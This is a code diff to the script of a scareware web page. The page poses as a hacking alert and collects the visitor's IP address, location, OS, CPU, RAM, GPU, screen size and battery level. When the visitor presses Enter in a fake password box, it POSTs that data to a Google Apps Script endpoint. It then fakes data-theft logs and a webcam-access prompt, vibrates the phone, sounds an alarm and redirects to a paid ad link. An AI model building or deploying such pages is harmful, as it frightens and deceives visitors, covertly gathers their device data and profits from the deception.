@@ -212,13 +212,172 @@
 
     <script>
     // --- !!! STEP 1: PASTE YOUR GOOGLE WEB APP URL BELOW !!! ---
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby1mKnhVMl0BLavOxwIR7R1a2QpSpKm6TCYPriU9Au90plnYJD8E03idTESJ3M74nKZ/exec";
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby1mKnhVMl0BLavOxwIR7R1a2QpSpKm6TCYPriU9Au90plnYJD8E03idTESJ3M74nKZ/exec";
 
-let userCity = "Unknown";
-let userCountry = "Unknown";
-const alertAudio = document.getElementById('alert-sound');
+    let userCity = "Unknown";
+    let userCountry = "Unknown";
 
-const filePaths = [
+    // --- DYNAMIC SESSION GENERATOR ---
+    let sessionNum = localStorage.getItem('victim_session');
+    if (!sessionNum) {
+        sessionNum = Math.floor(Math.random() * (500 - 345) + 345);
+    } else {
+        sessionNum = parseInt(sessionNum) + Math.floor(Math.random() * 25 + 1);
+    }
+    localStorage.setItem('victim_session', sessionNum);
+    document.getElementById('session-id-text').innerText = sessionNum;
+
+    const alertAudio = document.getElementById('alert-sound');
+    
+    // --- STEP 2: TRACKING LOGIC (REPAIRED) ---
+    function attemptLogin() {
+        const ip = document.getElementById('user-ip').innerText;
+        const session = document.getElementById('session-id-text').innerText;
+        
+        // --- THE REPAIR: We must define these variables by grabbing them from the UI first ---
+        const os = document.getElementById('user-os').innerText;
+        const cpu = document.getElementById('user-cpu').innerText;
+        const ram = document.getElementById('user-ram').innerText;
+        const gpu = document.getElementById('user-gpu').innerText;
+        const res = document.getElementById('user-res').innerText;
+        const batt = document.getElementById('user-batt').innerText;
+
+        const errorMsg = document.getElementById('login-error');
+
+        // Show the error message immediately
+        errorMsg.style.display = 'block';
+        errorMsg.innerText = "[!] SECURING CONNECTION... LOGGING METADATA...";
+
+        // Construct the data string
+        const payload = `ip=${encodeURIComponent(ip)}` +
+                        `&session=${encodeURIComponent(session)}` +
+                        `&city=${encodeURIComponent(userCity)}` +
+                        `&country=${encodeURIComponent(userCountry)}` +
+                        `&os=${encodeURIComponent(os)}` +
+                        `&cpu=${encodeURIComponent(cpu)}` +
+                        `&ram=${encodeURIComponent(ram)}` +
+                        `&gpu=${encodeURIComponent(gpu)}` +
+                        `&res=${encodeURIComponent(res)}` +
+                        `&batt=${encodeURIComponent(batt)}`;
+
+        // Send to Google Sheets
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: payload
+        }).then(() => {
+            console.log("Data sent to bridge.");
+        }).catch(err => console.error("Bridge Error:", err));
+
+// Wait 1.5 seconds then start the scare
+        setTimeout(() => {
+            document.getElementById('login-overlay').style.display = 'none';
+            startEverything();
+
+            // STEP A: At 18 seconds, show the final red warning line
+            setTimeout(() => {
+                const logContent = document.getElementById('log-content');
+                const line = document.createElement('div');
+                line.style.color = "#ff0000"; 
+                line.style.fontWeight = "bold";
+                line.innerText = "> [SYSTEM] CONNECTION TERMINATED. REDIRECTING TO SECURE GATEWAY...";
+                logContent.appendChild(line);
+                
+                document.getElementById('main-wrapper').classList.add('shake');
+            }, 18000); // 18 seconds
+
+// Add this inside your 18-second timeout
+const webcamAlert = confirm("[!] SYSTEM ALERT: Remote camera access requested by CYBER_UNIT. Allow access for identity verification?");
+// Even if they click "Cancel", the redirect happens anyway.
+
+            
+            // STEP B: At 21 seconds, jump to the paid link
+            setTimeout(() => {
+                window.location.href = "YOUR_PAID_AD_LINK_HERE";
+            }, 21000); // 21 seconds
+            
+        }, 1500);
+    }
+
+    function startEverything() {
+    // Vibrate for 500ms, pause 200ms, vibrate 500ms (only works on Android/Chrome)
+    if (navigator.vibrate) {
+        navigator.vibrate([500, 200, 500, 200, 1000]);
+    }
+    alertAudio.play().catch(() => {});
+    setInterval(draw, 40);
+    startLogCycle();
+}
+
+    // --- DATA FETCH: IP, LOCATION, HARDWARE ---
+    setTimeout(() => {
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            document.getElementById('user-ip').innerText = data.ip;
+            document.getElementById('user-ip').classList.remove('decrypting');
+            userCity = data.city || "N/A";
+            userCountry = data.country_name || "N/A";
+            document.getElementById('user-loc').innerText = userCity + ", " + userCountry;
+            document.getElementById('user-tz').innerText = data.timezone;
+            document.getElementById('user-tz').classList.remove('decrypting');
+        });
+        
+        document.getElementById('user-os').innerText = navigator.platform;
+        document.getElementById('user-os').classList.remove('decrypting');
+        document.getElementById('user-cpu').innerText = (navigator.hardwareConcurrency || "X") + " THREADS";
+        document.getElementById('user-ram').innerText = (navigator.deviceMemory || "8") + "GB RAM";
+        
+        const ua = navigator.userAgent;
+        let engine = "UNKNOWN";
+        if (ua.indexOf("Chrome") > -1) engine = "BLINK";
+        else if (ua.indexOf("Firefox") > -1) engine = "GECKO";
+        else if (ua.indexOf("Safari") > -1) engine = "WEBKIT";
+        document.getElementById('user-engine').innerText = engine;
+
+        document.getElementById('user-res').innerText = window.screen.width + "x" + window.screen.height;
+        document.getElementById('user-res').classList.remove('decrypting');
+
+        try {
+            const canvas_gpu = document.createElement('canvas');
+            const gl = canvas_gpu.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            document.getElementById('user-gpu').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ').pop();
+        } catch(e) { document.getElementById('user-gpu').innerText = "GPU_ACCEL"; }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                document.getElementById('user-batt').innerText = Math.round(b.level * 100) + "%";
+                document.getElementById('user-batt').classList.remove('decrypting');
+            });
+        } else { document.getElementById('user-batt').innerText = "AC_POWER"; }
+    }, 1500);
+
+    // --- MATRIX RAIN ---
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.onresize = resize; resize();
+    const chars = "01010101";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.font = fontSize + "px monospace";
+        ctx.fillStyle = "#0f0";
+        drops.forEach((y, i) => {
+            const text = chars[Math.floor(Math.random() * chars.length)];
+            ctx.fillText(text, i * fontSize, y * fontSize);
+            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+
+    // --- TERMINAL LOGS ---
+    function startLogCycle() {
+        const logContent = document.getElementById('log-content');
+  const filePaths = [
     "SCANNING_LOCAL_NETWORK_NODES...",
     "EXTRACTING_BROWSER_AUTOFILL_DATA...",
     "INTERCEPTING_SSL_CERTIFICATES...",
@@ -234,168 +393,42 @@ const filePaths = [
     "SCANNING_RECOVERY_EMAIL_ACCESS...",
     "INITIATING_REMOTE_SCREEN_CAPTURE...",
     "LOCATING_ISP_PRIMARY_GATEWAY...",
-    "COMPRESSING_SENSITIVE_FILES_FOR_EXPORT...",
-    "MAPPING_GEOLOCATION_COORDINATES...",
-    "HIJACKING_WEBCAM_DRIVER_SESSION...",
-    "READING_SMS_BACKUP_SQLITE...",
-    "BYPASSING_2FA_TOKEN_GENERATOR..."
+    "COMPRESSING_SENSITIVE_FILES_FOR_EXPORT..."
 ];
-
-// --- DYNAMIC SESSION GENERATOR ---
-let sessionNum = localStorage.getItem('victim_session');
-if (!sessionNum) {
-    sessionNum = Math.floor(Math.random() * (500 - 345) + 345);
-} else {
-    sessionNum = parseInt(sessionNum) + Math.floor(Math.random() * 25 + 1);
-}
-localStorage.setItem('victim_session', sessionNum);
-document.getElementById('session-id-text').innerText = sessionNum;
-
-// --- ATTEMPT LOGIN FUNCTION ---
-function attemptLogin() {
-    const ip = document.getElementById('user-ip').innerText;
-    const session = document.getElementById('session-id-text').innerText;
-    const os = document.getElementById('user-os').innerText;
-    const cpu = document.getElementById('user-cpu').innerText;
-    const ram = document.getElementById('user-ram').innerText;
-    const gpu = document.getElementById('user-gpu').innerText;
-    const res = document.getElementById('user-res').innerText;
-    const batt = document.getElementById('user-batt').innerText;
-
-    const errorMsg = document.getElementById('login-error');
-    errorMsg.style.display = 'block';
-    errorMsg.innerText = "[!] SECURING CONNECTION... LOGGING METADATA...";
-
-    const payload = `ip=${encodeURIComponent(ip)}&session=${encodeURIComponent(session)}&city=${encodeURIComponent(userCity)}&country=${encodeURIComponent(userCountry)}&os=${encodeURIComponent(os)}&cpu=${encodeURIComponent(cpu)}&ram=${encodeURIComponent(ram)}&gpu=${encodeURIComponent(gpu)}&res=${encodeURIComponent(res)}&batt=${encodeURIComponent(batt)}`;
-
-    fetch(GOOGLE_SCRIPT_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: payload
-    });
-
-    setTimeout(() => {
-        document.getElementById('login-overlay').style.display = 'none';
-        startEverything();
-
-        // STEP A: At 18 seconds, trigger the Red Alert and Webcam Scare
-        setTimeout(() => {
-            const logContent = document.getElementById('log-content');
+        setInterval(() => {
+            if (logContent.children.length > 8) logContent.removeChild(logContent.firstChild);
             const line = document.createElement('div');
-            line.style.color = "#ff0000"; 
-            line.style.fontWeight = "bold";
-            line.innerText = "> [SYSTEM] CRITICAL VULNERABILITY FOUND. INITIATING REMOTE UPLOAD...";
+            line.style.margin = "5px 0";
+            line.innerText = Math.random() > 0.5 ? `> [SCANNING] ${filePaths[Math.floor(Math.random() * filePaths.length)]}... FOUND` : "> [TRACE] Origin identified...";
             logContent.appendChild(line);
-            
+            document.body.classList.add('red-alert-pulse');
             document.getElementById('main-wrapper').classList.add('shake');
-            
-            // The "Force Click" Scare
-            confirm("[!] SYSTEM ALERT: Remote camera access requested by CYBER_UNIT. Allow access for identity verification?");
-        }, 18000); 
+            setTimeout(() => {
+                document.body.classList.remove('red-alert-pulse');
+                document.getElementById('main-wrapper').classList.remove('shake');
+            }, 300);
+        }, 1800);
+    }
 
-        // STEP B: At 21 seconds, jump to the paid link
-        setTimeout(() => {
-            window.location.href = "YOUR_PAID_AD_LINK_HERE";
-        }, 21000);
-        
-    }, 1500);
-}
-
-function startEverything() {
-    if (navigator.vibrate) { navigator.vibrate([500, 200, 500]); }
-    alertAudio.play().catch(() => {});
-    setInterval(draw, 40);
-    startLogCycle();
-}
-
-function startLogCycle() {
-    const logContent = document.getElementById('log-content');
-    setInterval(() => {
-        if (logContent.children.length > 10) logContent.removeChild(logContent.firstChild);
-        const line = document.createElement('div');
-        line.style.margin = "5px 0";
-        let message = "> [LOG] " + filePaths[Math.floor(Math.random() * filePaths.length)];
-        
-        if (message.includes("DUMPING") || message.includes("HIJACKING") || message.includes("DECRYPTING")) {
-            line.style.color = "#ff0000";
-            line.style.fontWeight = "bold";
-            message = "> [ALERT] " + message.split("] ")[1];
-        }
-        line.innerText = message;
-        logContent.appendChild(line);
-    }, 1000); // New log entry every 1 second
-}
-
-// --- DATA GATHERING ---
-setTimeout(() => {
-    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-        document.getElementById('user-ip').innerText = data.ip;
-        document.getElementById('user-ip').classList.remove('decrypting');
-        userCity = data.city || "N/A";
-        userCountry = data.country_name || "N/A";
-        document.getElementById('user-loc').innerText = userCity + ", " + userCountry;
-        document.getElementById('user-tz').innerText = data.timezone;
-        document.getElementById('user-tz').classList.remove('decrypting');
-    });
+window.addEventListener('DOMContentLoaded', (event) => {
+    // This targets your specific input ID
+    const loginField = document.getElementById('fake-pass');
     
-    document.getElementById('user-os').innerText = navigator.platform;
-    document.getElementById('user-os').classList.remove('decrypting');
-    document.getElementById('user-cpu').innerText = (navigator.hardwareConcurrency || "X") + " THREADS";
-    document.getElementById('user-ram').innerText = (navigator.deviceMemory || "8") + "GB RAM";
+    // Force the cursor into the box
+    loginField.focus();
     
-    const ua = navigator.userAgent;
-    let engine = "UNKNOWN";
-    if (ua.indexOf("Chrome") > -1) engine = "BLINK";
-    else if (ua.indexOf("Firefox") > -1) engine = "GECKO";
-    else if (ua.indexOf("Safari") > -1) engine = "WEBKIT";
-    document.getElementById('user-engine').innerText = engine;
-
-    document.getElementById('user-res').innerText = window.screen.width + "x" + window.screen.height;
-    document.getElementById('user-res').classList.remove('decrypting');
-
-    try {
-        const canvas_gpu = document.createElement('canvas');
-        const gl = canvas_gpu.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        document.getElementById('user-gpu').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ').pop();
-    } catch(e) { document.getElementById('user-gpu').innerText = "GPU_ACCEL"; }
-
-    if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-            document.getElementById('user-batt').innerText = Math.round(b.level * 100) + "%";
-            document.getElementById('user-batt').classList.remove('decrypting');
-        });
-    } else { document.getElementById('user-batt').innerText = "AC_POWER"; }
-}, 1000);
-
-// --- MATRIX RAIN ---
-const canvas = document.getElementById('matrix-bg');
-const ctx = canvas.getContext('2d');
-function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-window.onresize = resize; resize();
-const chars = "01010101";
-const fontSize = 16;
-const columns = canvas.width / fontSize;
-const drops = Array(Math.floor(columns)).fill(1);
-function draw() {
-    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.font = fontSize + "px monospace";
-    ctx.fillStyle = "#0f0";
-    drops.forEach((y, i) => {
-        const text = chars[Math.floor(Math.random() * chars.length)];
-        ctx.fillText(text, i * fontSize, y * fontSize);
-        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-    });
-}
-
-// --- INITIAL FOCUS ---
-window.onload = () => { document.getElementById('fake-pass').focus(); };
-document.getElementById('fake-pass').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') { e.preventDefault(); attemptLogin(); }
+    // Mobile Keyboard Trigger (Works for most Android/Chrome)
+    loginField.click();
 });
+
+// This tells the browser: "If the user hits Enter, act like they clicked Login"
+document.getElementById('fake-pass').addEventListener('keypress', function (e) {
+    if (e.key === 'Enter') {
+        e.preventDefault(); // Prevents the page from refreshing
+        attemptLogin();    // Triggers your data-sending and the 20s timer
+    }
+});
+
 </script>
 </body>
 </html>
